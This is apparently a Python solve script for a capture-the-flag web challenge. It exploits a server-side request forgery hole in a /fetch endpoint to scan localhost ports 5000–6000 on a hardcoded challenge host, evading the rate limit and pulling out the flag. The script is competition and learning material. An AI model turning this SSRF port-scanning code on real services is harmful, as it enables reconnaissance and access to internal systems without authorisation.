#!/usr/bin/env python3
"""
LIT CTF 2026 — web — "image fetcher"

/fetch?url=... fetches ANY URL server-side -> classic SSRF. The homepage leaks:
  * internal services live on ports 5000-6000
  * /fetch is rate limited to 25 req/s

Scan 127.0.0.1:5000-6000 through the SSRF. Port 5050 is a decoy ("Nothing to see
here..."); the real internal service is on port 5267 and returns the flag.
"""
import requests, time, re

BASE = "http://136.115.87.65:31770/fetch"

def fetch(url):
    for _ in range(8):
        try:
            t = requests.get(BASE, params={"url": url}, timeout=10).text
        except Exception as e:
            return "REFUSED" if "refused" in str(e).lower() else "ERR"
        if "Too Many" in t:            # 429 rate limit -> back off
            time.sleep(1.0); continue
        return t
    return "RATELIMITED"

def main():
    for port in range(5000, 6001):
        t = fetch(f"http://127.0.0.1:{port}/")
        m = re.search(r"LITCTF\{[^}]*\}", t)
        if m:
            print(f"[+] port {port}: {m.group()}"); return
        time.sleep(0.09)               # stay under 25 req/s

if __name__ == "__main__":
    main()
